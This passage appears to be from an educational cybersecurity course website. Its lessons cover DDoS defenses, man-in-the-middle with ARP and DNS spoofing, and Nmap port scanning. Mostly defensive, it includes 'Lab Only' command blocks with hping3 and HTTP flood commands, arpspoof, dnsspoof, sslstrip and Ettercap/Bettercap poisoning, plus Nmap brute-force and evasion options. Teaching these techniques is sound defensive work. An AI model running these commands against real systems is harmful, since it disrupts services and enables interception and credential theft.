                  <li><strong>Scrubbing Centers:</strong> Clean traffic and forward legitimate traffic.</li>
                  <li><strong>Content Delivery Networks (CDNs):</strong> Distribute traffic across many servers.</li>
                  <li><strong>Anycast:</strong> Distribute traffic across multiple locations.</li>
                  <li><strong>Load Balancing:</strong> Distribute traffic across multiple servers.</li>
                  <li><strong>Auto-scaling:</strong> Dynamically add resources during attack.</li>
                  <li><strong>Web Application Firewall (WAF):</strong> Filter Layer 7 attacks.</li>
                  <li><strong>Intrusion Prevention System (IPS):</strong> Detect and block attack patterns.</li>
                </ul>

                <h4 class="sub-h">DDoS Protection Services</h4>
                <ul class="content-list">
                  <li><strong>Cloudflare:</strong> DDoS mitigation, CDN, WAF.</li>
                  <li><strong>Akamai Prolexic:</strong> DDoS mitigation.</li>
                  <li><strong>AWS Shield:</strong> DDoS protection for AWS.</li>
                  <li><strong>Azure DDoS Protection:</strong> For Azure resources.</li>
                  <li><strong>Google Cloud Armor:</strong> DDoS and WAF.</li>
                  <li><strong>Imperva:</strong> DDoS mitigation.</li>
                  <li><strong>Radware:</strong> DDoS mitigation.</li>
                  <li><strong>F5 Silverline:</strong> DDoS protection.</li>
                  <li><strong>Neustar:</strong> DDoS mitigation.</li>
                </ul>

                <h4 class="sub-h">Network Architecture Best Practices</h4>
                <ul class="content-list">
                  <li><strong>Redundancy:</strong> Multiple data centers, ISPs, and paths.</li>
                  <li><strong>Overprovisioning:</strong> Excess bandwidth to absorb attacks.</li>
                  <li><strong>Segmentation:</strong> Isolate critical services.</li>
                  <li><strong>DMZ:</strong> Separate public-facing services.</li>
                  <li><strong>Rate Limiting at Edge:</strong> Block attacks before reaching core.</li>
                  <li><strong>SYN Cookies:</strong> Mitigate SYN floods.</li>
                  <li><strong>Connection Limits:</strong> Limit connections per IP.</li>
                  <li><strong>Timeouts:</strong> Short timeouts for idle connections.</li>
                  <li><strong>Anycast DNS:</strong> Distribute DNS queries.</li>
                </ul>

                <h4 class="sub-h">Application Layer Defenses</h4>
                <ul class="content-list">
                  <li><strong>CAPTCHA:</strong> Challenge suspicious clients.</li>
                  <li><strong>JavaScript Challenges:</strong> Require JS execution.</li>
                  <li><strong>Cookie Challenges:</strong> Require cookies.</li>
                  <li><strong>Behavioral Analysis:</strong> Detect non-human patterns.</li>
                  <li><strong>Rate Limiting per Session:</strong> Limit requests per session.</li>
                  <li><strong>Caching:</strong> Serve static content from cache.</li>
                  <li><strong>Compression:</strong> Reduce bandwidth.</li>
                  <li><strong>Optimized Code:</strong> Reduce resource consumption.</li>
                </ul>

                <h4 class="sub-h">Incident Response for DDoS</h4>
                <ul class="content-list">
                  <li><strong>Detection:</strong> Monitor for unusual traffic.</li>
                  <li><strong>Analysis:</strong> Identify attack type, volume, and source.</li>
                  <li><strong>Containment:</strong> Activate DDoS mitigation, rate limiting, blackholing.</li>
                  <li><strong>Communication:</strong> Notify stakeholders, ISPs, and mitigation providers.</li>
                  <li><strong>Mitigation:</strong> Apply filters, scrubbing, CDN.</li>
                  <li><strong>Recovery:</strong> Restore normal service.</li>
                  <li><strong>Post-Incident:</strong> Review, update defenses, document lessons learned.</li>
                </ul>

                <h4 class="sub-h">Legal and Regulatory</h4>
                <ul class="content-list">
                  <li><strong>Report Attacks:</strong> To law enforcement and CERT.</li>
                  <li><strong>Compliance:</strong> Ensure DDoS protection meets industry standards.</li>
                  <li><strong>Insurance:</strong> Consider cyber insurance.</li>
                  <li><strong>SLA:</strong> Ensure ISP and hosting SLAs cover DDoS.</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">6. Tools &amp; Commands</h3>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Tool</span><span>Purpose</span></div>
                  <div class="tool-row"><span>Cloudflare</span><span>DDoS mitigation, CDN, WAF</span></div>
                  <div class="tool-row"><span>Akamai Prolexic</span><span>DDoS mitigation</span></div>
                  <div class="tool-row"><span>AWS Shield</span><span>DDoS protection for AWS</span></div>
                  <div class="tool-row"><span>Azure DDoS Protection</span><span>DDoS protection for Azure</span></div>
                  <div class="tool-row"><span>Google Cloud Armor</span><span>DDoS and WAF</span></div>
                  <div class="tool-row"><span>Imperva</span><span>DDoS mitigation</span></div>
                  <div class="tool-row"><span>Radware</span><span>DDoS mitigation</span></div>
                  <div class="tool-row"><span>F5 Silverline</span><span>DDoS protection</span></div>
                  <div class="tool-row"><span>Neustar</span><span>DDoS mitigation</span></div>
                  <div class="tool-row"><span>Wireshark</span><span>Traffic analysis</span></div>
                  <div class="tool-row"><span>tcpdump</span><span>Packet capture</span></div>
                  <div class="tool-row"><span>hping3</span><span>Packet crafting</span></div>
                  <div class="tool-row"><span>Scapy</span><span>Packet crafting in Python</span></div>
                  <div class="tool-row"><span>LOIC</span><span>Low Orbit Ion Cannon</span></div>
                  <div class="tool-row"><span>HOIC</span><span>High Orbit Ion Cannon</span></div>
                  <div class="tool-row"><span>Slowloris</span><span>Layer 7 attack tool</span></div>
                  <div class="tool-row"><span>GoldenEye</span><span>HTTP flood tool</span></div>
                  <div class="tool-row"><span>HULK</span><span>HTTP flood tool</span></div>
                  <div class="tool-row"><span>RUDY</span><span>Slow POST tool</span></div>
                </div>

                <div class="chapter-code-block">
                  <div class="code-block-head"><span>DDoS Testing Commands (Lab Only)</span></div>
                  <pre><code># SYN flood
hping3 -S --flood -V -p 80 target

# UDP flood
hping3 --udp --flood -p 53 target

# ICMP flood
hping3 --icmp --flood target

# Slowloris attack
slowloris target -p 80

# GoldenEye HTTP flood
goldeneye.py http://target

# HULK HTTP flood
hulk -u http://target

# Capture traffic
tcpdump -i eth0 -w capture.pcap
wireshark capture.pcap

# Count connections
netstat -an | grep :80 | wc -l
ss -s</code></pre>
                </div>
              </section>

              <section class="content-block">
                <h3 class="content-h">7. Key Takeaways</h3>
                <ul class="content-list takeaways">
                  <li>DDoS attacks overwhelm a target with traffic from many sources.</li>
                  <li>They target the Availability pillar of the CIA Triad.</li>
                  <li>Types: Volume-based, Protocol-based, Application Layer.</li>
                  <li>Amplification and reflection multiply attack volume.</li>
                  <li>Botnets are used to launch attacks.</li>
                  <li>Impact: financial loss, reputation damage, operational disruption.</li>
                  <li>Defenses: rate limiting, scrubbing, CDNs, Anycast, WAF, DDoS protection services.</li>
                  <li>Incident response: detect, analyze, contain, mitigate, recover, review.</li>
                  <li>Tools: Cloudflare, AWS Shield, Akamai, Wireshark, hping3, LOIC, HOIC.</li>
                  <li>Understanding DDoS is essential for maintaining service availability.</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">8. Further Reading</h3>
                <div class="reading-list">
                  <a href="https://www.cloudflare.com/" target="_blank" rel="noopener">Cloudflare — DDoS mitigation</a>
                  <a href="https://aws.amazon.com/shield/" target="_blank" rel="noopener">AWS Shield — DDoS protection</a>
                  <a href="https://azure.microsoft.com/en-us/services/ddos-protection/" target="_blank" rel="noopener">Azure DDoS Protection</a>
                  <a href="https://cloud.google.com/armor" target="_blank" rel="noopener">Google Cloud Armor — DDoS and WAF</a>
                  <a href="https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html" target="_blank" rel="noopener">OWASP — Denial of Service Cheat Sheet</a>
                </div>
              </section>
            ` },
                    { id: "4.4", title: "Man-in-the-Middle (MITM), ARP Spoofing & DNS Spoofing", pages: "375-390", read: 20,
            build: "Perform ARP spoofing in a lab and capture HTTP traffic with Wireshark.",

            content: `
              <section class="content-block">
                <h3 class="content-h">1. Introduction</h3>
                <p><strong>A Man-in-the-Middle (MITM) attack</strong> is a type of cyberattack where an attacker secretly intercepts, relays, and possibly alters the communication between two parties who believe they are communicating directly with each other. The attacker positions themselves between the client and the server, allowing them to eavesdrop, modify, or inject data without either party's knowledge.</p>
                <p><strong>ARP Spoofing</strong> (also called ARP Poisoning) is a technique used in a local area network (LAN) where an attacker sends falsified Address Resolution Protocol (ARP) messages to associate their MAC address with the IP address of a legitimate device (such as the default gateway). This causes traffic intended for that IP to be sent to the attacker instead, enabling MITM attacks.</p>
                <p><strong>DNS Spoofing</strong> (also called DNS Cache Poisoning) is a technique where an attacker corrupts the Domain Name System (DNS) resolver's cache with false DNS records. This causes users to be redirected to malicious websites instead of legitimate ones, even when they type the correct domain name.</p>
              </section>

              <section class="content-block">
                <h3 class="content-h">2. Real-World Scenarios</h3>
                <ul class="content-list">
                  <li><strong>MITM:</strong> A user connects to public Wi-Fi at an airport. An attacker on the same network uses ARP spoofing to redirect traffic through their machine. The attacker uses sslstrip to downgrade HTTPS to HTTP, capturing login credentials. The user sees the familiar login page and has no idea their credentials were stolen.</li>
                  <li><strong>ARP Spoofing:</strong> In a corporate LAN, an attacker sends gratuitous ARP replies claiming the gateway's IP (192.168.1.1) is at the attacker's MAC address. All devices update their ARP caches. Now all internet-bound traffic flows through the attacker.</li>
                  <li><strong>DNS Spoofing:</strong> An attacker compromises a home router's DNS settings. When the user types www.bank.com, the malicious DNS server returns the IP of a phishing site that looks exactly like the bank's website. The user enters credentials, which are captured.</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">3. MITM, ARP Spoofing &amp; DNS Spoofing In Depth</h3>

                <figure class="content-figure">
                  <img src="./img/mitm-arp-dns.png" alt="MITM attack via ARP spoofing and DNS spoofing — attacker intercepts traffic between client and gateway" />
                  <figcaption>Figure 4.4 — MITM positions the attacker between client and server. ARP spoofing redirects LAN traffic; DNS spoofing redirects domain resolution.</figcaption>
                </figure>

                <h4 class="sub-h">How MITM Works</h4>
                <div class="step-flow">
                  <div class="step-item"><span class="step-num">1</span> Interception: Attacker gains access to the communication path via ARP spoofing, DNS spoofing, rogue Wi-Fi, or compromised router.</div>
                  <div class="step-item"><span class="step-num">2</span> Decryption (if applicable): If traffic is encrypted (HTTPS), attacker may attempt SSL stripping or present a fake certificate.</div>
                  <div class="step-item"><span class="step-num">3</span> Monitoring: Attacker captures sensitive data (credentials, session cookies, emails).</div>
                  <div class="step-item"><span class="step-num">4</span> Modification: Attacker may alter data in transit (e.g., change bank account numbers).</div>
                  <div class="step-item"><span class="step-num">5</span> Forwarding: Attacker relays modified traffic to the original destination, so neither party notices.</div>
                </div>

                <h4 class="sub-h">How ARP Spoofing Works</h4>
                <ul class="content-list">
                  <li>ARP is a stateless protocol; devices accept ARP replies even if they did not send a request.</li>
                  <li>An attacker sends forged ARP replies to the victim: "IP 192.168.1.1 is at MAC AA:BB:CC:DD:EE:FF" (attacker's MAC).</li>
                  <li>The victim updates its ARP cache and sends all traffic destined for the gateway to the attacker.</li>
                  <li>The attacker forwards the traffic to the real gateway (or not), while capturing it.</li>
                  <li>The attacker can also poison the gateway's ARP cache to intercept return traffic.</li>
                </ul>

                <h4 class="sub-h">How DNS Spoofing Works</h4>
                <ul class="content-list">
                  <li>DNS resolves domain names to IP addresses.</li>
                  <li>An attacker can poison a DNS resolver's cache by sending forged DNS responses.</li>
                  <li>Methods:
                    <ul>
                      <li><strong>DNS Cache Poisoning:</strong> Injecting false records into a resolver's cache.</li>
                      <li><strong>DNS Server Spoofing:</strong> Impersonating a legitimate DNS server.</li>
                      <li><strong>Hosts File Modification:</strong> Changing the local hosts file on a victim's machine.</li>
                      <li><strong>Router DNS Hijacking:</strong> Changing the DNS settings on a home router.</li>
                      <li><strong>DNS Tunneling:</strong> Encapsulating other protocols over DNS.</li>
                    </ul>
                  </li>
                  <li>Once the cache is poisoned, all users of that resolver are redirected to malicious IPs.</li>
                </ul>

                <h4 class="sub-h">Types of MITM Attacks</h4>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Type</span><span>Description</span></div>
                  <div class="tool-row"><span>ARP Spoofing</span><span>Redirecting LAN traffic via fake ARP messages</span></div>
                  <div class="tool-row"><span>DNS Spoofing</span><span>Redirecting domain resolution to malicious IPs</span></div>
                  <div class="tool-row"><span>SSL Stripping</span><span>Downgrading HTTPS to HTTP</span></div>
                  <div class="tool-row"><span>Rogue Wi-Fi</span><span>Setting up a fake access point</span></div>
                  <div class="tool-row"><span>Session Hijacking</span><span>Stealing session cookies to impersonate user</span></div>
                  <div class="tool-row"><span>IP Spoofing</span><span>Faking source IP address</span></div>
                  <div class="tool-row"><span>HTTPS Spoofing</span><span>Using fake certificates to intercept TLS</span></div>
                  <div class="tool-row"><span>Email Hijacking</span><span>Intercepting email communications</span></div>
                  <div class="tool-row"><span>Wi-Fi Eavesdropping</span><span>Capturing unencrypted wireless traffic</span></div>
                  <div class="tool-row"><span>Port Stealing</span><span>Manipulating switch CAM table</span></div>
                </div>
              </section>

              <section class="content-block">
                <h3 class="content-h">4. Attack Vectors</h3>
                <div class="cia-grid">
                  <div class="cia-attack">
                    <span class="cia-label attack">Attack Vectors</span>
                    <ul>
                      <li><strong>Public Wi-Fi:</strong> Easy target for ARP spoofing and rogue AP.</li>
                      <li><strong>Compromised Router:</strong> Changing DNS settings or firmware.</li>
                      <li><strong>Malware:</strong> Installing a proxy or rootkit on victim's device.</li>
                      <li><strong>Insider Threat:</strong> Malicious employee with network access.</li>
                      <li><strong>Physical Access:</strong> Plugging in a rogue device.</li>
                      <li><strong>Weak Encryption:</strong> Exploiting WEP/WPA weaknesses.</li>
                      <li><strong>DNS Vulnerabilities:</strong> Exploiting open resolvers.</li>
                      <li><strong>SSL/TLS Weaknesses:</strong> Downgrade attacks, certificate spoofing.</li>
                    </ul>
                  </div>
                  <div class="cia-attack">
                    <span class="cia-label attack">Tools Used by Attackers</span>
                    <ul>
                      <li><strong>Ettercap:</strong> Comprehensive MITM suite.</li>
                      <li><strong>Bettercap:</strong> Modern MITM framework.</li>
                      <li><strong>arpspoof:</strong> Simple ARP spoofing tool.</li>
                      <li><strong>dnsspoof:</strong> DNS spoofing tool.</li>
                      <li><strong>sslstrip:</strong> SSL stripping tool.</li>
                      <li><strong>mitmproxy:</strong> Interactive HTTPS proxy.</li>
                      <li><strong>Wireshark:</strong> Packet capture and analysis.</li>
                      <li><strong>Cain &amp; Abel:</strong> Windows password recovery and MITM.</li>
                      <li><strong>Responder:</strong> LLMNR/NBT-NS/mDNS poisoner.</li>
                      <li><strong>Yersinia:</strong> Layer 2 attack tool.</li>
                      <li><strong>Scapy:</strong> Packet crafting in Python.</li>
                      <li><strong>Driftnet:</strong> Image sniffer for MITM.</li>
                      <li><strong>Evilginx2:</strong> Advanced phishing and MITM.</li>
                    </ul>
                  </div>
                </div>

                <h4 class="sub-h">Real-World MITM Incidents</h4>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Incident</span><span>Year</span><span>Impact</span></div>
                  <div class="tool-row"><span>DigiNotar</span><span>2011</span><span>Rogue CA certificates issued to intercept Google traffic in Iran</span></div>
                  <div class="tool-row"><span>Superfish</span><span>2015</span><span>Lenovo laptops shipped with adware that installed a root CA, enabling MITM</span></div>
                  <div class="tool-row"><span>Belkin Router</span><span>2014</span><span>Routers replaced SSL certificates, causing MITM</span></div>
                  <div class="tool-row"><span>NSA QUANTUM</span><span>2013</span><span>Nation-state MITM attacks</span></div>
                  <div class="tool-row"><span>DarkHotel</span><span>2014</span><span>MITM attacks on hotel Wi-Fi</span></div>
                  <div class="tool-row"><span>Slack</span><span>2017</span><span>Vulnerability allowed MITM on Slack connections</span></div>
                </div>
              </section>

              <section class="content-block">
                <h3 class="content-h">5. Defensive Controls</h3>

                <h4 class="sub-h">Against ARP Spoofing</h4>
                <ul class="content-list">
                  <li><strong>Dynamic ARP Inspection (DAI):</strong> Validates ARP packets against DHCP snooping binding table.</li>
                  <li><strong>DHCP Snooping:</strong> Builds trusted binding table.</li>
                  <li><strong>Static ARP Entries:</strong> For critical devices.</li>
                  <li><strong>Port Security:</strong> Limit MAC addresses per port.</li>
                  <li><strong>ARP Monitoring:</strong> Tools like arpwatch to detect changes.</li>
                  <li><strong>Encryption:</strong> HTTPS, VPN, SSH to protect data even if ARP spoofed.</li>
                  <li><strong>Network Segmentation:</strong> VLANs to limit scope.</li>
                  <li><strong>802.1X:</strong> Port-based authentication.</li>
                </ul>

                <h4 class="sub-h">Against DNS Spoofing</h4>
                <ul class="content-list">
                  <li><strong>DNSSEC:</strong> Cryptographically signs DNS records.</li>
                  <li><strong>DNS over HTTPS (DoH) / DNS over TLS (DoT):</strong> Encrypts DNS queries.</li>
                  <li><strong>Trusted DNS Resolvers:</strong> Use Cloudflare (1.1.1.1), Google (8.8.8.8), Quad9 (9.9.9.9).</li>
                  <li><strong>DNS Filtering:</strong> Block malicious domains.</li>
                  <li><strong>Hosts File Protection:</strong> Prevent unauthorized changes.</li>
                  <li><strong>Router Security:</strong> Change default passwords, update firmware.</li>
                  <li><strong>Monitoring:</strong> Log DNS queries, detect anomalies.</li>
                  <li><strong>DNSSEC Validation:</strong> Ensure resolvers validate signatures.</li>
                  <li><strong>Rate Limiting:</strong> Prevent DNS amplification.</li>
                </ul>

                <h4 class="sub-h">Against MITM</h4>
                <ul class="content-list">
                  <li><strong>End-to-End Encryption:</strong> Use TLS, Signal, PGP.</li>
                  <li><strong>HTTPS Everywhere:</strong> Enforce HTTPS, use HSTS.</li>
                  <li><strong>Certificate Pinning:</strong> Prevent fake certificates.</li>
                  <li><strong>VPN:</strong> Encrypt all traffic over untrusted networks.</li>
                  <li><strong>Avoid Public Wi-Fi:</strong> Or use VPN if necessary.</li>
                  <li><strong>Verify Certificates:</strong> Check for valid, trusted certificates.</li>
                  <li><strong>MFA:</strong> Adds layer beyond passwords.</li>
                  <li><strong>Network Monitoring:</strong> Detect unusual traffic patterns.</li>
                  <li><strong>Security Awareness:</strong> Train users to recognize phishing and rogue APs.</li>
                  <li><strong>Endpoint Security:</strong> Antivirus, EDR, firewall.</li>
                  <li><strong>Zero Trust:</strong> Never trust, always verify.</li>
                </ul>

                <h4 class="sub-h">General Best Practices</h4>
                <ul class="content-list">
                  <li>Keep systems and firmware updated.</li>
                  <li>Use strong, unique passwords.</li>
                  <li>Enable MFA everywhere.</li>
                  <li>Use encrypted protocols (SSH, HTTPS, SFTP).</li>
                  <li>Segment networks.</li>
                  <li>Monitor network traffic.</li>
                  <li>Conduct regular security audits.</li>
                  <li>Implement incident response plan.</li>
                  <li>Educate users.</li>
                  <li>Use reputable security tools.</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">6. Tools &amp; Commands</h3>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Tool</span><span>Purpose</span></div>
                  <div class="tool-row"><span>Wireshark</span><span>Packet capture and analysis</span></div>
                  <div class="tool-row"><span>Ettercap</span><span>MITM and ARP spoofing</span></div>
                  <div class="tool-row"><span>Bettercap</span><span>Network attack framework</span></div>
                  <div class="tool-row"><span>arpspoof</span><span>ARP spoofing tool</span></div>
                  <div class="tool-row"><span>dnsspoof</span><span>DNS spoofing tool</span></div>
                  <div class="tool-row"><span>sslstrip</span><span>SSL stripping tool</span></div>
                  <div class="tool-row"><span>mitmproxy</span><span>Interactive HTTPS proxy</span></div>
                  <div class="tool-row"><span>Responder</span><span>LLMNR/NBT-NS/mDNS poisoner</span></div>
                  <div class="tool-row"><span>Yersinia</span><span>Layer 2 attack tool</span></div>
                  <div class="tool-row"><span>Scapy</span><span>Packet crafting in Python</span></div>
                  <div class="tool-row"><span>Driftnet</span><span>Image sniffer for MITM</span></div>
                  <div class="tool-row"><span>Evilginx2</span><span>Advanced phishing and MITM</span></div>
                  <div class="tool-row"><span>arpwatch</span><span>ARP monitoring</span></div>
                  <div class="tool-row"><span>DNSSEC</span><span>DNS security extensions</span></div>
                  <div class="tool-row"><span>Cloudflare 1.1.1.1</span><span>Trusted DNS resolver</span></div>
                  <div class="tool-row"><span>Google DNS</span><span>Trusted DNS resolver</span></div>
                  <div class="tool-row"><span>Quad9</span><span>Trusted DNS resolver</span></div>
                </div>

                <div class="chapter-code-block">
                  <div class="code-block-head"><span>MITM / ARP / DNS Commands (Lab Only)</span></div>
                  <pre><code># ARP spoof victim and gateway
arpspoof -i eth0 -t 192.168.1.10 192.168.1.1

# DNS spoofing
dnsspoof -i eth0 -f hosts.txt

# SSL stripping
sslstrip -l 8080

# Ettercap MITM
ettercap -T -q -i eth0 -M arp:remote /192.168.1.10// /192.168.1.1//

# Bettercap ARP spoof
bettercap -iface eth0 -eval "set arp.spoof.targets 192.168.1.10; arp.spoof on"

# Start mitmproxy
mitmproxy -p 8080

# View ARP cache
arp -a
ip neigh    # Linux

# Query Cloudflare DNS
dig @1.1.1.1 example.com
nslookup example.com 8.8.8.8</code></pre>
                </div>
              </section>

              <section class="content-block">
                <h3 class="content-h">7. Key Takeaways</h3>
                <ul class="content-list takeaways">
                  <li>MITM intercepts and possibly alters communication between two parties.</li>
                  <li>ARP Spoofing redirects LAN traffic by faking ARP replies.</li>
                  <li>DNS Spoofing redirects domain resolution to malicious IPs.</li>
                  <li>Attacks target confidentiality and integrity.</li>
                  <li>Tools: Ettercap, Bettercap, arpspoof, dnsspoof, sslstrip, mitmproxy, Responder.</li>
                  <li>Defenses: DAI, DHCP Snooping, DNSSEC, DoH/DoT, HTTPS, HSTS, certificate pinning, VPN, MFA.</li>
                  <li>Monitoring and user education are essential.</li>
                  <li>Understanding MITM, ARP spoofing, and DNS spoofing is critical for network security.</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">8. Further Reading</h3>
                <div class="reading-list">
                  <a href="https://www.ettercap-project.org/" target="_blank" rel="noopener">Ettercap — MITM and ARP spoofing suite</a>
                  <a href="https://www.bettercap.org/" target="_blank" rel="noopener">Bettercap — Network attack framework</a>
                  <a href="https://mitmproxy.org/" target="_blank" rel="noopener">mitmproxy — Interactive HTTPS proxy</a>
                  <a href="https://cheatsheetseries.owasp.org/cheatsheets/Man-in-the-middle_attack.html" target="_blank" rel="noopener">OWASP — MITM Cheat Sheet</a>
                  <a href="https://www.dnssec.net/" target="_blank" rel="noopener">DNSSEC — DNS Security Extensions</a>
                </div>
              </section>
            ` },
                    { id: "4.5", title: "Port Scanning & Nmap", pages: "391-406", read: 20,
            build: "Scan a lab network with Nmap and identify open ports and services.",

            content: `
              <section class="content-block">
                <h3 class="content-h">1. Introduction</h3>
                <p><strong>Port Scanning</strong> is the process of systematically probing a target system's TCP and UDP ports to determine which ports are open, closed, or filtered. It is a fundamental reconnaissance technique used by both attackers and security professionals to discover running services, identify potential entry points, and map the attack surface of a network.</p>
                <p><strong>Nmap (Network Mapper)</strong> is the most widely used open-source port scanning and network discovery tool. Developed by Gordon Lyon (Fyodor), Nmap is used for network inventory, managing service upgrade schedules, and monitoring host or service uptime. It supports a wide range of scanning techniques, service and version detection, operating system fingerprinting, and extensible scripting via the Nmap Scripting Engine (NSE).</p>
              </section>

              <section class="content-block">
                <h3 class="content-h">2. Real-World Scenario</h3>
                <p>A penetration tester is hired to assess the security of a company's external network. Using Nmap, the tester scans the range for open ports. The scan reveals that one server has port 22 (SSH) open, port 80 (HTTP) open, and port 3306 (MySQL) open and accessible from the Internet. The tester then uses Nmap's service detection (<code>-sV</code>) to identify specific versions. The MySQL version is outdated and has known vulnerabilities. This finding is documented and reported to the client, who then blocks port 3306 at the firewall and patches the MySQL server.</p>
                <p>In another scenario, a system administrator uses Nmap to inventory all devices on the corporate network. The scan reveals an unauthorized device (a rogue access point) connected to the network. The administrator disconnects it and investigates how it was installed.</p>
              </section>

              <section class="content-block">
                <h3 class="content-h">3. Port Scanning &amp; Nmap In Depth</h3>

                <figure class="content-figure">
                  <img src="./img/port-scanning-nmap.png" alt="Port scanning with Nmap — TCP SYN scan, service detection, and OS fingerprinting" />
                  <figcaption>Figure 4.5 — Nmap probes TCP/UDP ports to determine their state and identify running services.</figcaption>
                </figure>

                <h4 class="sub-h">What is a Port?</h4>
                <p>A port is a logical endpoint for network communication. Ports are numbered 0–65535. The first 1024 are well-known ports (e.g., 22 SSH, 80 HTTP, 443 HTTPS). Ports allow multiple services to run on a single IP address. A port is "open" if a service is listening on it, "closed" if no service is listening, and "filtered" if a firewall or filter is blocking access.</p>

                <h4 class="sub-h">How Port Scanning Works</h4>
                <ul class="content-list">
                  <li><strong>TCP SYN Scan:</strong> Sends a SYN packet. If the port is open, the target responds with SYN-ACK. If closed, RST. This is the default and most popular scan type because it is fast and relatively stealthy.</li>
                  <li><strong>TCP Connect Scan:</strong> Completes the full TCP three-way handshake. More reliable but easily logged by the target.</li>
                  <li><strong>UDP Scan:</strong> Sends UDP packets. If the port is open, no response or a UDP response. If closed, ICMP port unreachable. Slower and less reliable.</li>
                  <li><strong>Other Scan Types:</strong> FIN, NULL, Xmas, ACK, Window, Maimon, Idle (zombie) scans. These manipulate TCP flags to evade detection or bypass firewalls.</li>
                </ul>

                <h4 class="sub-h">Port States</h4>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>State</span><span>Description</span></div>
                  <div class="tool-row"><span>Open</span><span>A service is listening on the port.</span></div>
                  <div class="tool-row"><span>Closed</span><span>No service is listening, but the port is reachable.</span></div>
                  <div class="tool-row"><span>Filtered</span><span>A firewall or filter is blocking probes.</span></div>
                  <div class="tool-row"><span>Unfiltered</span><span>Port is reachable, but Nmap cannot determine if open or closed (ACK scan).</span></div>
                  <div class="tool-row"><span>Open|Filtered</span><span>Nmap cannot distinguish between open and filtered (UDP, FIN, NULL, Xmas).</span></div>
                  <div class="tool-row"><span>Closed|Filtered</span><span>Nmap cannot distinguish between closed and filtered (Idle scan).</span></div>
                </div>

                <h4 class="sub-h">Nmap Command Structure</h4>
                <p><code>nmap [Scan Type] [Options] {target}</code></p>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Flag</span><span>Scan Type</span></div>
                  <div class="tool-row"><span>-sS</span><span>TCP SYN scan (default, requires root)</span></div>
                  <div class="tool-row"><span>-sT</span><span>TCP connect scan</span></div>
                  <div class="tool-row"><span>-sU</span><span>UDP scan</span></div>
                  <div class="tool-row"><span>-sA</span><span>ACK scan (firewall detection)</span></div>
                  <div class="tool-row"><span>-sF</span><span>FIN scan</span></div>
                  <div class="tool-row"><span>-sN</span><span>NULL scan</span></div>
                  <div class="tool-row"><span>-sX</span><span>Xmas scan</span></div>
                  <div class="tool-row"><span>-sI</span><span>Idle (zombie) scan</span></div>
                </div>

                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Flag</span><span>Purpose</span></div>
                  <div class="tool-row"><span>-p 80,443</span><span>Scan specific ports</span></div>
                  <div class="tool-row"><span>-p 1-1000</span><span>Scan a port range</span></div>
                  <div class="tool-row"><span>-p-</span><span>Scan all 65535 ports</span></div>
                  <div class="tool-row"><span>-F</span><span>Fast scan (top 100 ports)</span></div>
                  <div class="tool-row"><span>--top-ports 1000</span><span>Scan top 1000 ports</span></div>
                  <div class="tool-row"><span>-sV</span><span>Service and version detection</span></div>
                  <div class="tool-row"><span>-O</span><span>Operating system detection</span></div>
                  <div class="tool-row"><span>-A</span><span>Aggressive scan (OS, version, scripts, traceroute)</span></div>
                  <div class="tool-row"><span>-Pn</span><span>Skip host discovery</span></div>
                  <div class="tool-row"><span>-n</span><span>No DNS resolution (faster)</span></div>
                  <div class="tool-row"><span>-T0 to -T5</span><span>Timing templates (paranoid to insane)</span></div>
                  <div class="tool-row"><span>--script</span><span>Run NSE scripts</span></div>
                  <div class="tool-row"><span>-oN, -oX, -oG</span><span>Output formats (normal, XML, grepable)</span></div>
                </div>

                <h4 class="sub-h">Nmap Scripting Engine (NSE)</h4>
                <p>NSE allows users to write and share scripts for automated tasks such as vulnerability detection, service discovery, and backdoor detection. There are over 600 scripts organized into categories: auth, broadcast, brute, default, discovery, dos, exploit, external, fuzzer, intrusive, malware, safe, version, vuln.</p>
                <pre><code>nmap --script http-enum -p 80 192.168.1.10
nmap --script smb-os-discovery 192.168.1.10
nmap --script ssh-brute -p 22 192.168.1.10
nmap --script vuln 192.168.1.10
nmap --script "http-*" 192.168.1.10</code></pre>

                <h4 class="sub-h">Firewall and IDS Evasion Techniques</h4>
                <ul class="content-list">
                  <li><strong>Packet Fragmentation (-f):</strong> Splits packets into smaller fragments to bypass simple filters.</li>
                  <li><strong>Decoy Scanning (-D RND:10):</strong> Sends packets from decoy IP addresses to obscure the real source.</li>
                  <li><strong>Spoofing MAC Address (--spoof-mac):</strong> Changes the source MAC address.</li>
                  <li><strong>Timing Manipulation (-T0, --scan-delay):</strong> Slows the scan to evade rate-based detection.</li>
                  <li><strong>Source Port Manipulation (--source-port):</strong> Uses a trusted source port (e.g., 53, 80) to bypass firewall rules.</li>
                  <li><strong>Idle Scan (-sI):</strong> Uses a zombie host to scan the target, hiding the attacker's IP.</li>
                  <li><strong>Host Discovery Bypass (-Pn):</strong> Skips ping and treats all hosts as online.</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">4. Attack Vectors</h3>
                <div class="cia-grid">
                  <div class="cia-attack">
                    <span class="cia-label attack">Reconnaissance Phase</span>
                    <ul>
                      <li>Identify live hosts on a network.</li>
                      <li>Discover open ports and running services.</li>
                      <li>Determine service versions and operating systems.</li>
                      <li>Map the attack surface.</li>
                      <li>Find potential entry points for exploitation.</li>
                    </ul>
                  </div>
                  <div class="cia-attack">
                    <span class="cia-label attack">Attack Scenarios</span>
                    <ul>
                      <li><strong>SSH Brute Force:</strong> Open port 22 → use Hydra or Nmap NSE ssh-brute.</li>
                      <li><strong>Web Application Attacks:</strong> Open port 80/443 → use Burp Suite, SQLMap, or Nikto.</li>
                      <li><strong>Database Exploitation:</strong> Open port 3306 (MySQL), 5432 (PostgreSQL), 1433 (MSSQL) → attempt default credentials or known exploits.</li>
                      <li><strong>RDP Attacks:</strong> Open port 3389 → brute force or exploit BlueKeep.</li>
                      <li><strong>SMB Attacks:</strong> Open port 445 → exploit EternalBlue (MS17-010).</li>
                      <li><strong>FTP Anonymous Login:</strong> Open port 21 → attempt anonymous access.</li>
